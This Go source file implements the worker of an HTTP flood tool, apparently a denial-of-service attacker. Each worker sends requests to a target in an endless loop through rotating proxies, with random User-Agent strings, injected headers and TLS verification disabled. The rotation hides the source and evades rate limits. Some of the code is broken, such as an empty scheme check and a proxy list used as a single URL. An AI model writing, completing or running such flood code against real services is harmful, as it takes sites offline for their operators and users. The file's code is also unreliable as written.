package main

import (
	"bytes"
	"net/http"
	"crypto/tls"
	"net/url"
)

type floodWorker struct {
	dead           bool
	exitChan       chan int
	id             int
	RequestCounter int
}

func (fw *floodWorker) Start() {	
	go func() {
		defer fw.Kill()
		client := &http.Client{}
		if scheme == "https" {
		}
		
		for {
			if fw.dead {
				return
			}
			
			//Gets proxy
			proxyList := getProxyList()
			
			//Creating Proxy
			proxyStr := proxyList
			proxyURL, err := url.Parse(proxyStr)
			if err != nil {
				lastErr = err.Error()
			}
	
			//Skip certificate verify for performance
			secureTransport := &http.Transport{
				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
				Proxy: http.ProxyURL(proxyURL),
			}
			client = &http.Client{Transport: secureTransport}

			body := []byte(tokenizedBody.String())
			req, _ := http.NewRequest(*method, tokenizedTarget.String(), bytes.NewBuffer(body))
			req.Header.Set("User-Agent", getRandomUserAgent())
			if *method == "POST" {
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
			}
			//Inject custom headers right before sending
			injectHeaders(req)
			resp, err := client.Do(req)
			if err != nil {
				lastErr = err.Error()
			}
			// Close body to prevent a "too many files open" error
			err = resp.Body.Close()
			if err != nil && lastErr == "" {
				lastErr = err.Error()
			}
			fw.RequestCounter += 1 //Worker specific counter
			requestChan <- true
		}
	}()
}

func (fw *floodWorker) Kill() {
	fw.dead = true
	fw.exitChan <- fw.id
}
